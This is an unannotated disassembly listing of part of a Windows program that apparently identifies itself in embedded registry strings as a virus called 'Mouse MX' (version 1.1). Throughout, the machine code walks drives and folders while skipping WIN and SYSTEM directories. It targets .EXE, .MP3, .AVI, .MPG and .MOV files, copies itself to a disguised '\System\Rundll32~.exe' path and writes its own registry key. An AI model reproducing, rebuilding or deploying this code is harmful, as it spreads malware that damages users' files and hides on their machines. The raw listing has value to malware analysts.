  40a166:	83 fb 13             	cmp    $0x13,%ebx
  40a169:	74 05                	je     0x40a170
  40a16b:	83 fb 32             	cmp    $0x32,%ebx
  40a16e:	75 3f                	jne    0x40a1af
  40a170:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40a173:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a179:	e8 f6 8f ff ff       	call   0x403174
  40a17e:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a184:	8b 95 b0 fe ff ff    	mov    -0x150(%ebp),%edx
  40a18a:	e8 cd 90 ff ff       	call   0x40325c
  40a18f:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a195:	ba a8 a5 40 00       	mov    $0x40a5a8,%edx
  40a19a:	e8 bd 90 ff ff       	call   0x40325c
  40a19f:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  40a1a5:	e8 ca fd ff ff       	call   0x409f74
  40a1aa:	e9 28 03 00 00       	jmp    0x40a4d7
  40a1af:	8d 95 9c fe ff ff    	lea    -0x164(%ebp),%edx
  40a1b5:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  40a1bb:	e8 1c af ff ff       	call   0x4050dc
  40a1c0:	8b 85 9c fe ff ff    	mov    -0x164(%ebp),%eax
  40a1c6:	8d 95 a0 fe ff ff    	lea    -0x160(%ebp),%edx
  40a1cc:	e8 93 f6 ff ff       	call   0x409864
  40a1d1:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  40a1d7:	ba b4 a5 40 00       	mov    $0x40a5b4,%edx
  40a1dc:	e8 0f 91 ff ff       	call   0x4032f0
  40a1e1:	0f 85 a9 01 00 00    	jne    0x40a390
  40a1e7:	b8 8c 00 00 00       	mov    $0x8c,%eax
  40a1ec:	e8 53 86 ff ff       	call   0x402844
  40a1f1:	48                   	dec    %eax
  40a1f2:	0f 85 df 02 00 00    	jne    0x40a4d7
  40a1f8:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a1fe:	8a 15 60 c5 40 00    	mov    0x40c560,%dl
  40a204:	e8 e7 8f ff ff       	call   0x4031f0
  40a209:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a20f:	ba c4 a5 40 00       	mov    $0x40a5c4,%edx
  40a214:	e8 43 90 ff ff       	call   0x40325c
  40a219:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a21f:	ba 94 a5 40 00       	mov    $0x40a594,%edx
  40a224:	e8 33 90 ff ff       	call   0x40325c
  40a229:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a22f:	ba a8 a5 40 00       	mov    $0x40a5a8,%edx
  40a234:	e8 23 90 ff ff       	call   0x40325c
  40a239:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a23f:	8b 95 b0 fe ff ff    	mov    -0x150(%ebp),%edx
  40a245:	e8 12 90 ff ff       	call   0x40325c
  40a24a:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  40a250:	e8 63 ac ff ff       	call   0x404eb8
  40a255:	84 c0                	test   %al,%al
  40a257:	0f 85 7a 02 00 00    	jne    0x40a4d7
  40a25d:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a263:	8a 15 60 c5 40 00    	mov    0x40c560,%dl
  40a269:	e8 82 8f ff ff       	call   0x4031f0
  40a26e:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a274:	ba c4 a5 40 00       	mov    $0x40a5c4,%edx
  40a279:	e8 de 8f ff ff       	call   0x40325c
  40a27e:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a284:	ba 94 a5 40 00       	mov    $0x40a594,%edx
  40a289:	e8 ce 8f ff ff       	call   0x40325c
  40a28e:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a294:	ba a8 a5 40 00       	mov    $0x40a5a8,%edx
  40a299:	e8 be 8f ff ff       	call   0x40325c
  40a29e:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a2a4:	8b 95 b0 fe ff ff    	mov    -0x150(%ebp),%edx
  40a2aa:	e8 ad 8f ff ff       	call   0x40325c
  40a2af:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  40a2b5:	50                   	push   %eax
  40a2b6:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40a2b9:	8d 85 9c fe ff ff    	lea    -0x164(%ebp),%eax
  40a2bf:	e8 b0 8e ff ff       	call   0x403174
  40a2c4:	8d 85 9c fe ff ff    	lea    -0x164(%ebp),%eax
  40a2ca:	8b 95 b0 fe ff ff    	mov    -0x150(%ebp),%edx
  40a2d0:	e8 87 8f ff ff       	call   0x40325c
  40a2d5:	8b 85 9c fe ff ff    	mov    -0x164(%ebp),%eax
  40a2db:	5a                   	pop    %edx
  40a2dc:	e8 0b ad ff ff       	call   0x404fec
  40a2e1:	6a 00                	push   $0x0
  40a2e3:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40a2e6:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a2ec:	e8 83 8e ff ff       	call   0x403174
  40a2f1:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a2f7:	8b 95 b0 fe ff ff    	mov    -0x150(%ebp),%edx
  40a2fd:	e8 5a 8f ff ff       	call   0x40325c
  40a302:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  40a308:	e8 97 90 ff ff       	call   0x4033a4
  40a30d:	50                   	push   %eax
  40a30e:	8d 85 9c fe ff ff    	lea    -0x164(%ebp),%eax
  40a314:	ba 64 c5 40 00       	mov    $0x40c564,%edx
  40a319:	b9 00 01 00 00       	mov    $0x100,%ecx
  40a31e:	e8 19 8f ff ff       	call   0x40323c
  40a323:	8d 85 9c fe ff ff    	lea    -0x164(%ebp),%eax
  40a329:	ba d0 a5 40 00       	mov    $0x40a5d0,%edx
  40a32e:	e8 29 8f ff ff       	call   0x40325c
  40a333:	8b 85 9c fe ff ff    	mov    -0x164(%ebp),%eax
  40a339:	e8 66 90 ff ff       	call   0x4033a4
  40a33e:	50                   	push   %eax
  40a33f:	e8 a8 a2 ff ff       	call   0x4045ec
  40a344:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40a347:	8d 85 9c fe ff ff    	lea    -0x164(%ebp),%eax
  40a34d:	e8 22 8e ff ff       	call   0x403174
  40a352:	8d 85 9c fe ff ff    	lea    -0x164(%ebp),%eax
  40a358:	8b 95 b0 fe ff ff    	mov    -0x150(%ebp),%edx
  40a35e:	e8 f9 8e ff ff       	call   0x40325c
  40a363:	8b 85 9c fe ff ff    	mov    -0x164(%ebp),%eax
  40a369:	e8 36 90 ff ff       	call   0x4033a4
  40a36e:	8b d0                	mov    %eax,%edx
  40a370:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a376:	e8 91 8e ff ff       	call   0x40320c
  40a37b:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  40a381:	ba 21 00 00 00       	mov    $0x21,%edx
  40a386:	e8 3d ab ff ff       	call   0x404ec8
  40a38b:	e9 47 01 00 00       	jmp    0x40a4d7
  40a390:	80 3d 64 c6 40 00 01 	cmpb   $0x1,0x40c664
  40a397:	0f 85 3a 01 00 00    	jne    0x40a4d7
  40a39d:	8d 95 9c fe ff ff    	lea    -0x164(%ebp),%edx
  40a3a3:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  40a3a9:	e8 2e ad ff ff       	call   0x4050dc
  40a3ae:	8b 85 9c fe ff ff    	mov    -0x164(%ebp),%eax
  40a3b4:	8d 95 a0 fe ff ff    	lea    -0x160(%ebp),%edx
  40a3ba:	e8 a5 f4 ff ff       	call   0x409864
  40a3bf:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  40a3c5:	ba f0 a5 40 00       	mov    $0x40a5f0,%edx
  40a3ca:	e8 21 8f ff ff       	call   0x4032f0
  40a3cf:	0f 84 9c 00 00 00    	je     0x40a471
  40a3d5:	8d 95 9c fe ff ff    	lea    -0x164(%ebp),%edx
  40a3db:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  40a3e1:	e8 f6 ac ff ff       	call   0x4050dc
  40a3e6:	8b 85 9c fe ff ff    	mov    -0x164(%ebp),%eax
  40a3ec:	8d 95 a0 fe ff ff    	lea    -0x160(%ebp),%edx
  40a3f2:	e8 6d f4 ff ff       	call   0x409864
  40a3f7:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  40a3fd:	ba 00 a6 40 00       	mov    $0x40a600,%edx
  40a402:	e8 e9 8e ff ff       	call   0x4032f0
  40a407:	74 68                	je     0x40a471
  40a409:	8d 95 9c fe ff ff    	lea    -0x164(%ebp),%edx
  40a40f:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  40a415:	e8 c2 ac ff ff       	call   0x4050dc
  40a41a:	8b 85 9c fe ff ff    	mov    -0x164(%ebp),%eax
  40a420:	8d 95 a0 fe ff ff    	lea    -0x160(%ebp),%edx
  40a426:	e8 39 f4 ff ff       	call   0x409864
  40a42b:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  40a431:	ba 10 a6 40 00       	mov    $0x40a610,%edx
  40a436:	e8 b5 8e ff ff       	call   0x4032f0
  40a43b:	74 34                	je     0x40a471
  40a43d:	8d 95 9c fe ff ff    	lea    -0x164(%ebp),%edx
  40a443:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  40a449:	e8 8e ac ff ff       	call   0x4050dc
  40a44e:	8b 85 9c fe ff ff    	mov    -0x164(%ebp),%eax
  40a454:	8d 95 a0 fe ff ff    	lea    -0x160(%ebp),%edx
  40a45a:	e8 05 f4 ff ff       	call   0x409864
  40a45f:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  40a465:	ba 20 a6 40 00       	mov    $0x40a620,%edx
  40a46a:	e8 81 8e ff ff       	call   0x4032f0
  40a46f:	75 66                	jne    0x40a4d7
  40a471:	b8 14 00 00 00       	mov    $0x14,%eax
  40a476:	e8 c9 83 ff ff       	call   0x402844
  40a47b:	48                   	dec    %eax
  40a47c:	75 59                	jne    0x40a4d7
  40a47e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40a481:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a487:	e8 e8 8c ff ff       	call   0x403174
  40a48c:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a492:	8b 95 b0 fe ff ff    	mov    -0x150(%ebp),%edx
  40a498:	e8 bf 8d ff ff       	call   0x40325c
  40a49d:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  40a4a3:	ba 20 00 00 00       	mov    $0x20,%edx
  40a4a8:	e8 1b aa ff ff       	call   0x404ec8
  40a4ad:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40a4b0:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a4b6:	e8 b9 8c ff ff       	call   0x403174
  40a4bb:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  40a4c1:	8b 95 b0 fe ff ff    	mov    -0x150(%ebp),%edx
  40a4c7:	e8 90 8d ff ff       	call   0x40325c
  40a4cc:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  40a4d2:	e8 fd aa ff ff       	call   0x404fd4
  40a4d7:	8d 85 a4 fe ff ff    	lea    -0x15c(%ebp),%eax
  40a4dd:	e8 be aa ff ff       	call   0x404fa0
  40a4e2:	85 c0                	test   %eax,%eax
  40a4e4:	0f 84 0f fb ff ff    	je     0x409ff9
  40a4ea:	8d 85 a4 fe ff ff    	lea    -0x15c(%ebp),%eax
  40a4f0:	e8 cf aa ff ff       	call   0x404fc4
  40a4f5:	33 c0                	xor    %eax,%eax
  40a4f7:	5a                   	pop    %edx
  40a4f8:	59                   	pop    %ecx
  40a4f9:	59                   	pop    %ecx
  40a4fa:	64 89 10             	mov    %edx,%fs:(%eax)
  40a4fd:	68 32 a5 40 00       	push   $0x40a532
  40a502:	8d 85 98 fe ff ff    	lea    -0x168(%ebp),%eax
  40a508:	ba 03 00 00 00       	mov    $0x3,%edx
  40a50d:	e8 ee 8b ff ff       	call   0x403100
  40a512:	8d 85 a4 fe ff ff    	lea    -0x15c(%ebp),%eax
  40a518:	ba b4 46 40 00       	mov    $0x4046b4,%edx
  40a51d:	e8 ae 90 ff ff       	call   0x4035d0
  40a522:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a525:	e8 b6 8b ff ff       	call   0x4030e0
  40a52a:	c3                   	ret
  40a52b:	e9 30 88 ff ff       	jmp    0x402d60
  40a530:	eb d0                	jmp    0x40a502
  40a532:	5f                   	pop    %edi
  40a533:	5e                   	pop    %esi
  40a534:	5b                   	pop    %ebx
  40a535:	8b e5                	mov    %ebp,%esp
  40a537:	5d                   	pop    %ebp
  40a538:	c3                   	ret
  40a539:	00 00                	add    %al,(%eax)
  40a53b:	00 ff                	add    %bh,%bh
  40a53d:	ff                   	(bad)
  40a53e:	ff                   	(bad)
  40a53f:	ff 03                	incl   (%ebx)
  40a541:	00 00                	add    %al,(%eax)
  40a543:	00 2a                	add    %ch,(%edx)
  40a545:	2e 2a 00             	sub    %cs:(%eax),%al
  40a548:	ff                   	(bad)
  40a549:	ff                   	(bad)
  40a54a:	ff                   	(bad)
  40a54b:	ff 01                	incl   (%ecx)
  40a54d:	00 00                	add    %al,(%eax)
  40a54f:	00 2e                	add    %ch,(%esi)
  40a551:	00 00                	add    %al,(%eax)
  40a553:	00 ff                	add    %bh,%bh
  40a555:	ff                   	(bad)
  40a556:	ff                   	(bad)
  40a557:	ff 02                	incl   (%edx)
  40a559:	00 00                	add    %al,(%eax)
  40a55b:	00 2e                	add    %ch,(%esi)
  40a55d:	2e 00 00             	add    %al,%cs:(%eax)
  40a560:	ff                   	(bad)
  40a561:	ff                   	(bad)
  40a562:	ff                   	(bad)
  40a563:	ff 03                	incl   (%ebx)
  40a565:	00 00                	add    %al,(%eax)
  40a567:	00 57 49             	add    %dl,0x49(%edi)
  40a56a:	4e                   	dec    %esi
  40a56b:	00 ff                	add    %bh,%bh
  40a56d:	ff                   	(bad)
  40a56e:	ff                   	(bad)
  40a56f:	ff 06                	incl   (%esi)
  40a571:	00 00                	add    %al,(%eax)
  40a573:	00 53 59             	add    %dl,0x59(%ebx)
  40a576:	53                   	push   %ebx
  40a577:	54                   	push   %esp
  40a578:	45                   	inc    %ebp
  40a579:	4d                   	dec    %ebp
  40a57a:	00 00                	add    %al,(%eax)
  40a57c:	ff                   	(bad)
  40a57d:	ff                   	(bad)
  40a57e:	ff                   	(bad)
  40a57f:	ff 07                	incl   (%edi)
  40a581:	00 00                	add    %al,(%eax)
  40a583:	00 50 52             	add    %dl,0x52(%eax)
  40a586:	4f                   	dec    %edi
  40a587:	47                   	inc    %edi
  40a588:	5f                   	pop    %edi
  40a589:	4d                   	dec    %ebp
  40a58a:	58                   	pop    %eax
  40a58b:	00 ff                	add    %bh,%bh
  40a58d:	ff                   	(bad)
  40a58e:	ff                   	(bad)
  40a58f:	ff 08                	decl   (%eax)
  40a591:	00 00                	add    %al,(%eax)
  40a593:	00 4d 6f             	add    %cl,0x6f(%ebp)
  40a596:	75 73                	jne    0x40a60b
  40a598:	65 5f                	gs pop %edi
  40a59a:	4d                   	dec    %ebp
  40a59b:	58                   	pop    %eax
  40a59c:	00 00                	add    %al,(%eax)
  40a59e:	00 00                	add    %al,(%eax)
  40a5a0:	ff                   	(bad)
  40a5a1:	ff                   	(bad)
  40a5a2:	ff                   	(bad)
  40a5a3:	ff 01                	incl   (%ecx)
  40a5a5:	00 00                	add    %al,(%eax)
  40a5a7:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  40a5ab:	00 ff                	add    %bh,%bh
  40a5ad:	ff                   	(bad)
  40a5ae:	ff                   	(bad)
  40a5af:	ff 04 00             	incl   (%eax,%eax,1)
  40a5b2:	00 00                	add    %al,(%eax)
  40a5b4:	2e 45                	cs inc %ebp
  40a5b6:	58                   	pop    %eax
  40a5b7:	45                   	inc    %ebp
  40a5b8:	00 00                	add    %al,(%eax)
  40a5ba:	00 00                	add    %al,(%eax)
  40a5bc:	ff                   	(bad)
  40a5bd:	ff                   	(bad)
  40a5be:	ff                   	(bad)
  40a5bf:	ff 02                	incl   (%edx)
  40a5c1:	00 00                	add    %al,(%eax)
  40a5c3:	00 3a                	add    %bh,(%edx)
  40a5c5:	5c                   	pop    %esp
  40a5c6:	00 00                	add    %al,(%eax)
  40a5c8:	ff                   	(bad)
  40a5c9:	ff                   	(bad)
  40a5ca:	ff                   	(bad)
  40a5cb:	ff 15 00 00 00 5c    	call   *0x5c000000
  40a5d1:	53                   	push   %ebx
  40a5d2:	79 73                	jns    0x40a647
  40a5d4:	74 65                	je     0x40a63b
  40a5d6:	6d                   	insl   (%dx),%es:(%edi)
  40a5d7:	5c                   	pop    %esp
  40a5d8:	52                   	push   %edx
  40a5d9:	75 6e                	jne    0x40a649
  40a5db:	64 6c                	fs insb (%dx),%es:(%edi)
  40a5dd:	6c                   	insb   (%dx),%es:(%edi)
  40a5de:	33 32                	xor    (%edx),%esi
  40a5e0:	7e 2e                	jle    0x40a610
  40a5e2:	65 78 65             	gs js  0x40a64a
  40a5e5:	00 00                	add    %al,(%eax)
  40a5e7:	00 ff                	add    %bh,%bh
  40a5e9:	ff                   	(bad)
  40a5ea:	ff                   	(bad)
  40a5eb:	ff 04 00             	incl   (%eax,%eax,1)
  40a5ee:	00 00                	add    %al,(%eax)
  40a5f0:	2e 4d                	cs dec %ebp
  40a5f2:	50                   	push   %eax
  40a5f3:	33 00                	xor    (%eax),%eax
  40a5f5:	00 00                	add    %al,(%eax)
  40a5f7:	00 ff                	add    %bh,%bh
  40a5f9:	ff                   	(bad)
  40a5fa:	ff                   	(bad)
  40a5fb:	ff 04 00             	incl   (%eax,%eax,1)
  40a5fe:	00 00                	add    %al,(%eax)
  40a600:	2e 41                	cs inc %ecx
  40a602:	56                   	push   %esi
  40a603:	49                   	dec    %ecx
  40a604:	00 00                	add    %al,(%eax)
  40a606:	00 00                	add    %al,(%eax)
  40a608:	ff                   	(bad)
  40a609:	ff                   	(bad)
  40a60a:	ff                   	(bad)
  40a60b:	ff 04 00             	incl   (%eax,%eax,1)
  40a60e:	00 00                	add    %al,(%eax)
  40a610:	2e 4d                	cs dec %ebp
  40a612:	50                   	push   %eax
  40a613:	47                   	inc    %edi
  40a614:	00 00                	add    %al,(%eax)
  40a616:	00 00                	add    %al,(%eax)
  40a618:	ff                   	(bad)
  40a619:	ff                   	(bad)
  40a61a:	ff                   	(bad)
  40a61b:	ff 04 00             	incl   (%eax,%eax,1)
  40a61e:	00 00                	add    %al,(%eax)
  40a620:	2e 4d                	cs dec %ebp
  40a622:	4f                   	dec    %edi
  40a623:	56                   	push   %esi
  40a624:	00 00                	add    %al,(%eax)
  40a626:	00 00                	add    %al,(%eax)
  40a628:	55                   	push   %ebp
  40a629:	8b ec                	mov    %esp,%ebp
  40a62b:	6a 00                	push   $0x0
  40a62d:	53                   	push   %ebx
  40a62e:	56                   	push   %esi
  40a62f:	57                   	push   %edi
  40a630:	33 c0                	xor    %eax,%eax
  40a632:	55                   	push   %ebp
  40a633:	68 8e a7 40 00       	push   $0x40a78e
  40a638:	64 ff 30             	push   %fs:(%eax)
  40a63b:	64 89 20             	mov    %esp,%fs:(%eax)
  40a63e:	b2 01                	mov    $0x1,%dl
  40a640:	b8 50 93 40 00       	mov    $0x409350,%eax
  40a645:	e8 ba ed ff ff       	call   0x409404
  40a64a:	8b d8                	mov    %eax,%ebx
  40a64c:	33 c0                	xor    %eax,%eax
  40a64e:	55                   	push   %ebp
  40a64f:	68 6e a7 40 00       	push   $0x40a76e
  40a654:	64 ff 30             	push   %fs:(%eax)
  40a657:	64 89 20             	mov    %esp,%fs:(%eax)
  40a65a:	b1 01                	mov    $0x1,%cl
  40a65c:	ba a4 a7 40 00       	mov    $0x40a7a4,%edx
  40a661:	8b c3                	mov    %ebx,%eax
  40a663:	e8 90 ee ff ff       	call   0x4094f8
  40a668:	b9 c0 a7 40 00       	mov    $0x40a7c0,%ecx
  40a66d:	ba d4 a7 40 00       	mov    $0x40a7d4,%edx
  40a672:	8b c3                	mov    %ebx,%eax
  40a674:	e8 1f f0 ff ff       	call   0x409698
  40a679:	b9 e4 a7 40 00       	mov    $0x40a7e4,%ecx
  40a67e:	ba f0 a7 40 00       	mov    $0x40a7f0,%edx
  40a683:	8b c3                	mov    %ebx,%eax
  40a685:	e8 0e f0 ff ff       	call   0x409698
  40a68a:	b9 00 a8 40 00       	mov    $0x40a800,%ecx
  40a68f:	ba 10 a8 40 00       	mov    $0x40a810,%edx
  40a694:	8b c3                	mov    %ebx,%eax
  40a696:	e8 fd ef ff ff       	call   0x409698
  40a69b:	b9 20 a8 40 00       	mov    $0x40a820,%ecx
  40a6a0:	ba 30 a8 40 00       	mov    $0x40a830,%edx
  40a6a5:	8b c3                	mov    %ebx,%eax
  40a6a7:	e8 ec ef ff ff       	call   0x409698
  40a6ac:	b9 40 a8 40 00       	mov    $0x40a840,%ecx
  40a6b1:	ba 50 a8 40 00       	mov    $0x40a850,%edx
  40a6b6:	8b c3                	mov    %ebx,%eax
  40a6b8:	e8 db ef ff ff       	call   0x409698
  40a6bd:	b9 60 a8 40 00       	mov    $0x40a860,%ecx
  40a6c2:	ba 74 a8 40 00       	mov    $0x40a874,%edx
  40a6c7:	8b c3                	mov    %ebx,%eax
  40a6c9:	e8 ca ef ff ff       	call   0x409698
  40a6ce:	ba 84 a8 40 00       	mov    $0x40a884,%edx
  40a6d3:	8b c3                	mov    %ebx,%eax
  40a6d5:	e8 3e f1 ff ff       	call   0x409818
  40a6da:	84 c0                	test   %al,%al
  40a6dc:	75 23                	jne    0x40a701
  40a6de:	e8 d5 b3 ff ff       	call   0x405ab8
  40a6e3:	83 c4 f8             	add    $0xfffffff8,%esp
  40a6e6:	dd 1c 24             	fstpl  (%esp)
  40a6e9:	9b                   	fwait
  40a6ea:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a6ed:	e8 f2 ba ff ff       	call   0x4061e4
  40a6f2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40a6f5:	ba 84 a8 40 00       	mov    $0x40a884,%edx
  40a6fa:	8b c3                	mov    %ebx,%eax
  40a6fc:	e8 97 ef ff ff       	call   0x409698
  40a701:	8b c3                	mov    %ebx,%eax
  40a703:	e8 5c ed ff ff       	call   0x409464
  40a708:	ba 02 00 00 80       	mov    $0x80000002,%edx
  40a70d:	8b c3                	mov    %ebx,%eax
  40a70f:	e8 80 ed ff ff       	call   0x409494
  40a714:	b1 01                	mov    $0x1,%cl
  40a716:	ba 98 a8 40 00       	mov    $0x40a898,%edx
  40a71b:	8b c3                	mov    %ebx,%eax
  40a71d:	e8 d6 ed ff ff       	call   0x4094f8
  40a722:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a725:	ba 64 c5 40 00       	mov    $0x40c564,%edx
  40a72a:	b9 00 01 00 00       	mov    $0x100,%ecx
  40a72f:	e8 08 8b ff ff       	call   0x40323c
  40a734:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a737:	ba d0 a8 40 00       	mov    $0x40a8d0,%edx
  40a73c:	e8 1b 8b ff ff       	call   0x40325c
  40a741:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a744:	ba f0 a8 40 00       	mov    $0x40a8f0,%edx
  40a749:	e8 0e 8b ff ff       	call   0x40325c
  40a74e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40a751:	ba 00 a9 40 00       	mov    $0x40a900,%edx
  40a756:	8b c3                	mov    %ebx,%eax
  40a758:	e8 3b ef ff ff       	call   0x409698
  40a75d:	8b c3                	mov    %ebx,%eax
  40a75f:	e8 68 82 ff ff       	call   0x4029cc
  40a764:	33 c0                	xor    %eax,%eax
  40a766:	5a                   	pop    %edx
  40a767:	59                   	pop    %ecx
  40a768:	59                   	pop    %ecx
  40a769:	64 89 10             	mov    %edx,%fs:(%eax)
  40a76c:	eb 0a                	jmp    0x40a778
  40a76e:	e9 29 85 ff ff       	jmp    0x402c9c
  40a773:	e8 10 87 ff ff       	call   0x402e88
  40a778:	33 c0                	xor    %eax,%eax
  40a77a:	5a                   	pop    %edx
  40a77b:	59                   	pop    %ecx
  40a77c:	59                   	pop    %ecx
  40a77d:	64 89 10             	mov    %edx,%fs:(%eax)
  40a780:	68 95 a7 40 00       	push   $0x40a795
  40a785:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a788:	e8 53 89 ff ff       	call   0x4030e0
  40a78d:	c3                   	ret
  40a78e:	e9 cd 85 ff ff       	jmp    0x402d60
  40a793:	eb f0                	jmp    0x40a785
  40a795:	5f                   	pop    %edi
  40a796:	5e                   	pop    %esi
  40a797:	5b                   	pop    %ebx
  40a798:	59                   	pop    %ecx
  40a799:	5d                   	pop    %ebp
  40a79a:	c3                   	ret
  40a79b:	00 ff                	add    %bh,%bh
  40a79d:	ff                   	(bad)
  40a79e:	ff                   	(bad)
  40a79f:	ff 12                	call   *(%edx)
  40a7a1:	00 00                	add    %al,(%eax)
  40a7a3:	00 53 6f             	add    %dl,0x6f(%ebx)
  40a7a6:	66 74 77             	data16 je 0x40a820
  40a7a9:	61                   	popa
  40a7aa:	72 65                	jb     0x40a811
  40a7ac:	5c                   	pop    %esp
  40a7ad:	4d                   	dec    %ebp
  40a7ae:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7af:	75 73                	jne    0x40a824
  40a7b1:	65 5f                	gs pop %edi
  40a7b3:	4d                   	dec    %ebp
  40a7b4:	58                   	pop    %eax
  40a7b5:	32 00                	xor    (%eax),%al
  40a7b7:	00 ff                	add    %bh,%bh
  40a7b9:	ff                   	(bad)
  40a7ba:	ff                   	(bad)
  40a7bb:	ff 08                	decl   (%eax)
  40a7bd:	00 00                	add    %al,(%eax)
  40a7bf:	00 4d 6f             	add    %cl,0x6f(%ebp)
  40a7c2:	75 73                	jne    0x40a837
  40a7c4:	65 20 4d 58          	and    %cl,%gs:0x58(%ebp)
  40a7c8:	00 00                	add    %al,(%eax)
  40a7ca:	00 00                	add    %al,(%eax)
  40a7cc:	ff                   	(bad)
  40a7cd:	ff                   	(bad)
  40a7ce:	ff                   	(bad)
  40a7cf:	ff 04 00             	incl   (%eax,%eax,1)
  40a7d2:	00 00                	add    %al,(%eax)
  40a7d4:	4e                   	dec    %esi
  40a7d5:	61                   	popa
  40a7d6:	6d                   	insl   (%dx),%es:(%edi)
  40a7d7:	65 00 00             	add    %al,%gs:(%eax)
  40a7da:	00 00                	add    %al,(%eax)
  40a7dc:	ff                   	(bad)
  40a7dd:	ff                   	(bad)
  40a7de:	ff                   	(bad)
  40a7df:	ff 03                	incl   (%ebx)
  40a7e1:	00 00                	add    %al,(%eax)
  40a7e3:	00 31                	add    %dh,(%ecx)
  40a7e5:	2e 31 00             	xor    %eax,%cs:(%eax)
  40a7e8:	ff                   	(bad)
  40a7e9:	ff                   	(bad)
  40a7ea:	ff                   	(bad)
  40a7eb:	ff 07                	incl   (%edi)
  40a7ed:	00 00                	add    %al,(%eax)
  40a7ef:	00 56 65             	add    %dl,0x65(%esi)
  40a7f2:	72 73                	jb     0x40a867
  40a7f4:	69 6f 6e 00 ff ff ff 	imul   $0xffffff00,0x6e(%edi),%ebp
  40a7fb:	ff 05 00 00 00 76    	incl   0x76000000
  40a801:	69 72 75 73 00 00 00 	imul   $0x73,0x75(%edx),%esi
  40a808:	ff                   	(bad)
  40a809:	ff                   	(bad)
  40a80a:	ff                   	(bad)
  40a80b:	ff 04 00             	incl   (%eax,%eax,1)
  40a80e:	00 00                	add    %al,(%eax)
  40a810:	54                   	push   %esp
  40a811:	79 70                	jns    0x40a883
  40a813:	65 00 00             	add    %al,%gs:(%eax)
  40a816:	00 00                	add    %al,(%eax)
  40a818:	ff                   	(bad)
  40a819:	ff                   	(bad)
  40a81a:	ff                   	(bad)
  40a81b:	ff 06                	incl   (%esi)
  40a81d:	00 00                	add    %al,(%eax)
  40a81f:	00 50 6f             	add    %dl,0x6f(%eax)
  40a822:	6c                   	insb   (%dx),%es:(%edi)
  40a823:	73 6b                	jae    0x40a890
  40a825:	61                   	popa
  40a826:	00 00                	add    %al,(%eax)
  40a828:	ff                   	(bad)
  40a829:	ff                   	(bad)
  40a82a:	ff                   	(bad)
  40a82b:	ff 07                	incl   (%edi)
  40a82d:	00 00                	add    %al,(%eax)
  40a82f:	00 43 6f             	add    %al,0x6f(%ebx)
  40a832:	75 6e                	jne    0x40a8a2
  40a834:	74 72                	je     0x40a8a8
  40a836:	79 00                	jns    0x40a838
  40a838:	ff                   	(bad)
  40a839:	ff                   	(bad)
  40a83a:	ff                   	(bad)
  40a83b:	ff 06                	incl   (%esi)
  40a83d:	00 00                	add    %al,(%eax)
  40a83f:	00 54 61 72          	add    %dl,0x72(%ecx,%eiz,2)
  40a843:	6e                   	outsb  %ds:(%esi),(%dx)
  40a844:	f3 77 00             	repz ja 0x40a847
  40a847:	00 ff                	add    %bh,%bh
  40a849:	ff                   	(bad)
  40a84a:	ff                   	(bad)
  40a84b:	ff 04 00             	incl   (%eax,%eax,1)
  40a84e:	00 00                	add    %al,(%eax)
  40a850:	43                   	inc    %ebx
  40a851:	69 74 79 00 00 00 00 	imul   $0xff000000,0x0(%ecx,%edi,2),%esi
  40a858:	ff 
  40a859:	ff                   	(bad)
  40a85a:	ff                   	(bad)
  40a85b:	ff 09                	decl   (%ecx)
